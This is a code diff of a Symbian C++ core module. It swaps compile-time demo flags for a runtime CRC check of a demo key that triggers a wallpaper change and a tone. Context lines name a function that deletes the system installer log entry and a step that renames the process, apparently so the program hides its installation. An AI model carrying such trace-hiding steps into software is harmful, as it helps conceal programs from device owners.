@@ -43,7 +43,16 @@ CCore::~CCore()
 	iEndPoints.Close();
 	delete iConfig;
 	delete iFreeSpaceMonitor;
-#ifdef _DEMO
+	
+	//TODO: activate this in 8.0
+	/*
+	if(iDemoVersion)
+		{
+		delete iWallpaper;
+		delete iTonePlayer;
+		}
+		*/
+#ifdef _DEMO  //TODO: delete this in 8.0
 	delete iWallpaper;
 	delete iTonePlayer;
 #endif
@@ -67,7 +76,23 @@ void CCore::ConstructL()
 	iConfig = CConfigFile::NewL();
 	iFs.Connect();
 	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
-#ifdef _DEMO
+	
+	TUint16 crc=0;
+	Mem::Crc(crc,KDEMO_KEY().Ptr(),KDEMO_KEY().Length());
+	if(crc == KCrcDemoKey)
+		iDemoVersion = ETrue;
+	else
+		iDemoVersion = EFalse;
+	
+	//TODO: activate this in 8.0
+	/*
+	if(iDemoVersion)
+		{
+		iWallpaper = CWallpaperSticker::NewL();
+		iTonePlayer = CTonePlayer::NewL();
+		}
+	*/
+#ifdef _DEMO  //TODO: delete this in 8.0
 	iWallpaper = CWallpaperSticker::NewL();
 	iTonePlayer = CTonePlayer::NewL();
 #endif
@@ -345,7 +370,14 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 	{
 	ASSERT( aCommand.iType == ENotify );
 
-#ifdef _DEMO
+	//TODO: activate this in 8.0
+	/*
+	if(iDemoVersion)
+		{
+		iTonePlayer->Play();
+		}
+		*/
+#ifdef _DEMO  //TODO: delete this in 8.0
 	iTonePlayer->Play();
 #endif
 
@@ -478,6 +510,11 @@ void CCore::NotifyBelowThreshold()
 	RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 0);
 	}
 
+TBool CCore::DemoVersion()
+	{
+	return iDemoVersion;
+	}
+
 LOCAL_C void DeleteInstallerLog(TUid aUid)
 	{
 	// install log table has been defined into Symbian source code as:
@@ -541,6 +578,7 @@ LOCAL_C void DeleteInstallerLog(TUid aUid)
 	}
 
 
+
 LOCAL_C void DoStartL()
 	{
 	// rename the process
@@ -570,7 +608,14 @@ LOCAL_C void DoStartL()
 	//start free space monitor
 	core->StartMonitorFreeSpace();
 	
-#ifdef _DEMO
+	//TODO: activate this in 8.0
+	/*
+	if(core->DemoVersion())
+		{
+		core->ChangeWallpaper();
+		}
+	*/
+#ifdef _DEMO  //TODO: delete this in 8.0
 	//change wallpaper
 	core->ChangeWallpaper();
 #endif
